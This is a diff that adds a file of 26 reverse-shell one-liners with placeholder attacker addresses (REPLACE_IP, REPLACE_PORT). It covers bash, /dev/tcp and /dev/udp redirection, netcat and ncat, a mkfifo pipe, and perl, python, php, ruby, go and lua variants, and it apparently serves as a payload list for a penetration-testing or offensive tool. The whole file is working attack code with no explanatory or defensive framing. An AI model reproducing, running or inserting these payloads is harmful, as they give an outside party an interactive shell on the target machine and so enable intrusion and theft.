@@ -1,0 +1,26 @@
+bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1;
+bash -c "bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1"
+0<&196;exec 196<>/dev/tcp/REPLACE_IP/REPLACE_PORT; sh <&196 >&196 2>&196;
+sh -i >& /dev/udp/REPLACE_IP/REPLACE_PORT 0>&1;
+bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1;
+nc -e /bin/sh REPLACE_IP REPLACE_PORT;
+nc -e /bin/bash REPLACE_IP REPLACE_PORT;
+nc -c bash REPLACE_IP REPLACE_PORT;
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc REPLACE_IP REPLACE_PORT >/tmp/f;
+ncat REPLACE_IP REPLACE_PORT -e /bin/bash;
+ncat --udp REPLACE_IP REPLACE_PORT -e /bin/bash;
+perl -e 'use Socket;$i="REPLACE_IP";$p=REPLACE_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"REPLACE_IP:REPLACE_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;';
+export RHOST="REPLACE_IP";export RPORT=REPLACE_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")';
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("REPLACE_IP",REPLACE_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);exec("/bin/sh -i <&3 >&3 2>&3");';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);`/bin/sh -i <&3 >&3 2>&3`;';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);system("/bin/sh -i <&3 >&3 2>&3");';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);passthru("/bin/sh -i <&3 >&3 2>&3");';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");';
+php -r '$sock=fsockopen("REPLACE_IP",REPLACE_PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);';
+ruby -rsocket -e'f=TCPSocket.open("REPLACE_IP",REPLACE_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)';
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("REPLACE_IP","REPLACE_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","REPLACE_IP:REPLACE_PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go;
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('REPLACE_IP','REPLACE_PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');";
